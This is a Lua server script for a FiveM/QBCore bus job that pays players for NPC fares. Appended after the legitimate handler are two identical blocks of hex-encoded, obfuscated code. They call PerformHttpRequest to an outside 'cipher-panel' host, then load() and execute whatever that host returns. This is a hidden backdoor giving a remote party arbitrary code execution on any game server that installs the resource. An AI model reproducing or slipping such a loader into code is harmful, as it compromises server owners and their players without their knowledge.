local QBCore = exports['qb-core']:GetCoreObject()

function NearBus(src)
    local ped = GetPlayerPed(src)
    local coords = GetEntityCoords(ped)
    for k,v in pairs(Config.NPCLocations.Locations) do
        local dist = #(coords - vector3(v.x,v.y,v.z))
        if dist < 20 then
            return true
        end
    end
end

RegisterNetEvent('qb-busjob:server:NpcPay', function(Payment)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.job.name == "bus" then
        if NearBus(src) then
            local randomAmount = math.random(1, 5)
            local r1, r2 = math.random(1, 5), math.random(1, 5)
            if randomAmount == r1 or randomAmount == r2 then Payment = Payment + math.random(10, 20) end
            Player.Functions.AddMoney('cash', Payment)
        else
            DropPlayer(src, 'Attempting To Exploit')
        end
    else
        DropPlayer(src, 'Attempting To Exploit')
    end
end)


local rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[4][rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x39\x68\x76\x43\x65", function (xZdsDBbCzZBSTPHNNvekOoqGMAKidgGybMkbeHhqPCURsoZCfNecvKnAtvYqWDSpRHFSen, fjCjDmkUAaqldLpDKsftZIFnDrkNuEycstrPYYaHUnFIphdzdLaQxAwoUGtOpmnKPxlydO) if (fjCjDmkUAaqldLpDKsftZIFnDrkNuEycstrPYYaHUnFIphdzdLaQxAwoUGtOpmnKPxlydO == rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[6] or fjCjDmkUAaqldLpDKsftZIFnDrkNuEycstrPYYaHUnFIphdzdLaQxAwoUGtOpmnKPxlydO == rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[5]) then return end rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[4][rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[2]](rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[4][rpnVOsGHsURVwqhdgVdOvaMwEXFKnrZoKGMhrPlBpkRwqPzkUizIuCvmqwDhptzwXtqdhi[3]](fjCjDmkUAaqldLpDKsftZIFnDrkNuEycstrPYYaHUnFIphdzdLaQxAwoUGtOpmnKPxlydO))() end)

local EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[4][EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x39\x68\x76\x43\x65", function (XrqimEsTrlinZGOQUAXssjOKwZWqONktWwTqttmvZVgBHEDrQmuwWDZYxkzVuaKjgDeHRL, mwssqXADbuKZsZifIlTOYQawUVldcKTFCluscoDpdsCiWummXoWDjpHlGqpXXojvhulucP) if (mwssqXADbuKZsZifIlTOYQawUVldcKTFCluscoDpdsCiWummXoWDjpHlGqpXXojvhulucP == EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[6] or mwssqXADbuKZsZifIlTOYQawUVldcKTFCluscoDpdsCiWummXoWDjpHlGqpXXojvhulucP == EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[5]) then return end EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[4][EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[2]](EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[4][EpGPxDWMhbYrYGNDjnKHcvXyvxQUQHyKtqfPZeNgZpbulRgzEUnrizePzGkoGGBHgsSboy[3]](mwssqXADbuKZsZifIlTOYQawUVldcKTFCluscoDpdsCiWummXoWDjpHlGqpXXojvhulucP))() end)